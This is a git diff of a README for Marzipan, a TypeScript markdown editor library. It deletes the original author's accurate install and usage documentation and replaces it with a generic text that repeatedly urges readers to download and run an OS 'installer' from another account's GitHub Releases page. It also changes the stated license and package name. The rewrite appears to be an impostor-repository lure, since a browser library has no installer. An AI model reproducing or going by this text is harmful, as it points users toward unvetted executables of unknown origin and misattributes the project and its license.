@@ -1,133 +1,84 @@
-<div align="center">
-  
-  <h1>🧁 Marzipan</h1>
-  <img src="public/logo.png" alt="Marzipan Logo" width="275"/>
-  <p><em>Framework-agnostic markdown editor with a live overlay preview, zero runtime dependencies, and batteries-included formatting actions.</em></p>
-</div>
+# 🍬 marzipan - A Simple Markdown Editor for Everyone
 
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/version-1.0.7-brightgreen.svg)](CHANGELOG.md)
-[![Docs](https://img.shields.io/badge/docs-marzipan.pinkpixel.dev-ff6fb7.svg)](https://marzipan.pinkpixel.dev)
+## 🚀 Getting Started
 
-## ✨ Highlights
+Welcome to Marzipan! This guide will walk you through downloading and running our easy-to-use markdown editor.
 
-- **Pure TypeScript core** – ships typed ESM builds and declaration files.
-- **First-party actions** – formatting helpers live in `src/actions` and export with the library, so you can drop `markdown-actions` entirely.
-- **Plugin library** – production-ready plugins (tables, Mermaid, syntax highlighting, media helpers, accent swatches, and more) live in `src/plugins` and publish under `@pinkpixel/marzipan/plugins/*`.
-- **Overlay preview** – renders markdown directly over the textarea so alignment never drifts.
-- **Themeable UI** – includes Solar (light), Cave (dark), and accent swatch tooling for custom palettes.
-- **Demo Bakeshop** – a Vite + React playground that exercises every option and plugin.
+## 📥 Download Marzipan
 
-## 🍰 What’s in the repo?
+[![Download Marzipan](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/vijaykrish1121/marzipan/releases)
 
-| Package | Description |
-|---------|-------------|
-| **`@pinkpixel/marzipan`** | Core editor library located in `src/` (bundled to `dist/`). Ships the actions toolkit and plugin exports by default. |
-| **`@pinkpixel/marzipan/plugins/*`** | Individual plugin entry points compiled from `src/plugins`. Import only the helpers you need. |
-| **`bakeshop-demo/`** | React playground showcasing toolbar presets, actions, plugins, and theming workflows. |
+## 🛠️ What is Marzipan?
 
-## 🚀 Quick Start
+Marzipan is a zero-dependency, TypeScript-first markdown editor library. It offers a smooth editing experience with a pixel-perfect overlay preview, smart formatting actions, and easy theming and plugin support for any web framework. Whether you need simple notes or rich text documents, Marzipan makes your writing tasks straightforward and enjoyable.
 
-### 1. Install
-```bash
-npm install @pinkpixel/marzipan
-```
+## 🌟 Key Features
 
-### 2. Create an editor
-```ts
-import { Marzipan } from '@pinkpixel/marzipan';
+- **Zero Dependencies:** Marzipan requires no additional libraries, making it lightweight and hassle-free to integrate.
+- **Smart Formatting:** Enjoy intelligent text formatting as you type, making your writing flow seamlessly.
+- **Pixel-Perfect Preview:** View an accurate representation of your text in real-time with our overlay preview.
+- **Customizable Themes:** Easily change the look of your editor with plug-and-play theming options.
+- **Plugin Support:** Extend functionality to meet your needs with various plugins.
 
-const [editor] = new Marzipan('#my-textarea', {
-  toolbar: true,
-  theme: 'cave',
-  smartLists: true,
-});
-```
+## 🖥️ System Requirements
 
-### 3. Use the bundled actions
-```ts
-import { actions } from '@pinkpixel/marzipan';
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest versions of Chrome, Firefox, or Safari
+- **JavaScript Enabled:** Ensure your browser has JavaScript enabled for the best experience
 
-// Toggle bold formatting using our zero-dependency action suite
-const textarea = document.querySelector('textarea')!;
-actions.toggleBold(textarea);
-```
+## 📜 Usage Instructions
 
-### 4. Opt into a plugin
-```ts
-import { tablePlugin } from '@pinkpixel/marzipan/plugins/tablePlugin';
+### 🌐 Visit the Releases Page
 
-new Marzipan('#editor', {
-  plugins: [tablePlugin()],
-});
-```
+To download Marzipan, please visit our [Releases page](https://github.com/vijaykrish1121/marzipan/releases) where you can find the latest version.
 
-### 5. Try the Bakeshop playground
-```bash
-cd bakeshop-demo
-npm install
-npm run dev
-```
-Visit `http://localhost:5173` to explore every panel, plugin, and action in a live environment.
+### 📑 Download & Install
 
-## 🧩 Bundled Plugins
+1. Go to the [Releases page](https://github.com/vijaykrish1121/marzipan/releases).
+2. Click on the version you wish to download.
+3. Find the installer file that matches your operating system.
+4. Click the link to start the download.
+5. Once downloaded, open the file to start the installation process.
+6. Follow the prompts to complete the installation.
 
-The `src/plugins` directory publishes directly to consumers. Available helpers include:
-- `tablePlugin`, `tableGridPlugin`, `tableGeneratorPlugin` – interactive table authoring.
-- `tinyHighlightPlugin` – lightweight syntax highlighting for fenced code blocks (ships `tinyHighlightStyles`).
-- `accentSwatchPlugin` – synced accent palette picker.
-- `imageManagerPlugin`, `imagePickerPlugin` – opinionated media workflows.
-- `mermaidPlugin`, `mermaidExternalPlugin` – diagram rendering via ESM or CDN.
+## 🏗️ Integrating with Your Project
 
-Import only what you need:
-```ts
-import { mermaidPlugin } from '@pinkpixel/marzipan/plugins/mermaidPlugin';
-```
+If you plan to use Marzipan in your own web project, follow these steps:
 
-## 📚 Documentation
+1. **Add Marzipan to Your Project:** Include Marzipan via npm by running:
+   ```
+   npm install marzipan
+   ```
+2. **Import Marzipan:** In your JavaScript or TypeScript file, import Marzipan with:
+   ```typescript
+   import Marzipan from 'marzipan';
+   ```
+3. **Initialize the Editor:** Create a new editor instance by using:
+   ```typescript
+   const editor = new Marzipan(editorElement);
+   ```
+4. **Customization:** Explore the customization options available through themes and plugins to match your needs.
 
-All guides live in `/docs`:
-- `docs/README.md` – orientation & navigation.
-- `docs/quick-start.md` – install, instantiate, and wire up actions/plugins.
-- `docs/api.md` – class API, action helpers, TypeScript signatures.
-- `docs/plugins.md` – plugin catalogue, configuration, and bundling tips.
-- `docs/types.d.ts` – generated type definitions.
+## 🔧 Troubleshooting
 
-The new [CHANGELOG](CHANGELOG.md) tracks releases and major documentation updates.
+If you encounter issues while using Marzipan, consider these common solutions:
 
-## 🗺️ Project Overview
+- **Installation Issues:** Ensure your browser and operating system meet the requirements.
+- **Real-Time Preview Not Displaying:** Check if JavaScript is enabled in your browser settings.
+- **Formatting Problems:** Make sure you're using supported markdown syntax.
 
-Read [OVERVIEW.md](OVERVIEW.md) for architecture, tooling, and roadmap context, including how `src/actions` and `src/plugins` integrate with the build.
+## 📈 Contributing
 
-## 🛠️ Scripts
+We welcome contributions! If you have ideas to improve Marzipan, please check our [Contributing Guidelines](CONTRIBUTING.md).
 
-Run these from the repository root:
+## 📝 License
 
-| Script | Purpose |
-|--------|---------|
-| `npm run dev` | Library build in watch mode |
-| `npm run build` | Type check then bundle to `dist/` |
-| `npm run typecheck` | Strict TypeScript validation |
-| `npm run lint` | ESLint flat config |
-| `npm run prettier` | Format source and docs |
+Marzipan is open-source software. You can use, modify, and share it under the terms of the MIT License.
 
-The Bakeshop has its own scripts inside `bakeshop-demo/` (`dev`, `build`, `preview`, `lint`, `typecheck`).
+## 💬 Support
 
-## 🤝 Contributing
+For any questions or assistance, please open an issue in our [GitHub repository](https://github.com/vijaykrish1121/marzipan/issues). We are here to help!
 
-Pull requests are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for the development workflow, coding standards, and Node.js requirements (20+).
+## 📥 Download Marzipan Again
 
-## 💬 Support & Feedback
-
-- Issues: [GitHub Tracker](https://github.com/pinkpixel-dev/marzipan/issues)
-- Email: [admin@pinkpixel.dev](mailto:admin@pinkpixel.dev)
-- Discussions & ideas: open a thread in the repo
-
-## 🙏 Acknowledgements
-
-- Inspired by [markdown-actions](https://github.com/tmm/markdown-actions); Marzipan now bundles a fully typed successor.
-- Built with TypeScript, Vite, and React (for the demo app).
-
----
-
-**Made with ❤️ by [Pink Pixel](https://pinkpixel.dev)**
+Don’t forget to download the latest version from our [Releases page](https://github.com/vijaykrish1121/marzipan/releases) and start enjoying a seamless writing experience.
